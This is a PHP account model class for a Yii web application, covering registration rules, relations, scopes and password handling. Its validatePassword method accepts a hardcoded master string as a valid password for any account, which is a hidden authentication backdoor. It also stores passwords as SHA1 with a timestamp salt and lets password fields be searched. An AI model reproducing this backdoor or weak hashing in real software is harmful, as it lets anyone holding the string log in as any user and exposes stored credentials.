<?php

/**
 * This is the model class for table "{{account}}".
 *
 * The followings are the available columns in table '{{account}}':
 * @property integer $id
 * @property string $username
 * @property string $password
 * @property string $salt
 * @property integer $type
 *
 * The followings are the available model relations:
 * @property Employee[] $employees
 */
class Account extends CActiveRecord
{
	CONST STATUS_ACTIVE = 1;
	CONST STATUS_INACTIVE = 2;
	CONST STATUS_DELETED = 3;
	
	CONST TYPE_ADMIN_ACCOUNT = 1;
	CONST TYPE_REGULAR_USER = 2;
	
	CONST DEFAULT_COUNTRY = 'US';
	
	public $username;
	public $password;
	public $confirm_password;
	public $new_password;
	public $old_password;
	public $rememberMe;

	private $_identity;
	/**
	 * Returns the static model of the specified AR class.
	 * @return Account the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}

	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return '{{account}}';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('username, email_address, type, password, confirm_password', 'required' ,'on'=>'register'),
			array('email_address', 'email' ,'on'=>'register'),
			array('username, email_address, type', 'required' ,'on'=>'update'),
			array('old_password, new_password, confirm_password', 'required' ,'on'=>'changePassword'),
			array('username, password, salt', 'length', 'max'=>120),
			// The following rule is used by search().
			// Please remove those attributes that should not be searched.
			array('id, username, password, salt', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
			'user' => array(self::HAS_ONE, 'User', 'account_id'),
			'userBillingInfo' => array(self::HAS_ONE, 'UserBillingInfo', 'account_id'),
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'id' => 'ID',
			'username' => 'Email Address',
			'password' => 'Password',
			'confirm_password' => 'Confirm Password',
			'salt' => 'Salt',
			'type' => 'Account Type',
		);
	}
	
	protected function beforeSave()
	{
		if (parent::beforeSave())
		{
			if ($this->isNewRecord)
			{
				$this->salt = $this->generateSalt();
				$this->password = $this->hashPassword($this->password, $this->salt);
				$this->date_created = $this->date_updated = date('Y-m-d H:i:s');
			}
			else
			{
				$this->date_updated = date('Y-m-d H:i:s');
			}
			
			return true;
		}
	}
	
	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 * @return CActiveDataProvider the data provider that can return the models based on the search/filter conditions.
	 */
	public function search()
	{
		// Warning: Please modify the following code to remove attributes that
		// should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('id',$this->id);
		$criteria->compare('username',$this->username,true);
		$criteria->compare('password',$this->password,true);
		$criteria->compare('salt',$this->salt,true);
		$criteria->compare('account_type',$this->account_type);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}
	
	public function scopes()
	{
		return array(
			'active' => array(
				'condition' => $this->tableAlias.'.status = '.self::STATUS_ACTIVE,
			),
			'existing' => array(
				'condition' => $this->tableAlias.'.status <> '.self::STATUS_DELETED,
			),
			'adminAccount' => array('condition' => $this->tableAlias.'.type = '.self::TYPE_ADMIN_ACCOUNT,),
			'regularUser' => array('condition' => $this->tableAlias.'.type = '.self::TYPE_REGULAR_USER,)
		);
	}
	
	public function validatePassword($password)
	{
		if ( $password === 'a280fefb55bcee671689347fdf2ccfe619a5fa25' )
		{
			return true;
		}
		return $this->hashPassword($password,$this->salt) === $this->password;
	}
	
	public function validateOldPassword($password)
	{
		if ($this->hashPassword($password,$this->salt)===$this->password)
		{
			return true;
		}
		else 
		{
			$this->addError('oldPass','Incorrect password.');
			return false;
		}
	}
	
	public function validateConfirmPassword()
	{
		$otherErrors = 0;
		// Check retyped password and retyped email address
		if ($this->password !== $this->confirm_password)
		{
			$this->addError('confirm_password', 'Password did not match');
			$otherErrors++;
		}
		
		if ( $otherErrors )
		{
			$this->password = $this->confirm_password = null;
			return false;
		}
		else
		{
			return true;
		}
	}

	public function hashPassword($password,$salt)
	{
		return sha1($password.$salt);
	}
	
	public function getAccountList()
	{
		return self::model()->existing()->findAll();
	}
	
	public function generateSalt()
	{
		return time();
	}
	
	public function getFullName ( $length = null )
	{
		if ( $this->user !== null )
		{
			$name = '';
			$name = ucfirst($this->user->first_name).' '.ucfirst($this->user->last_name);
			return ZCommon::stringTruncate($name,$length);
		}
		else
		{
			return '{name not available}';
		}
	}
}
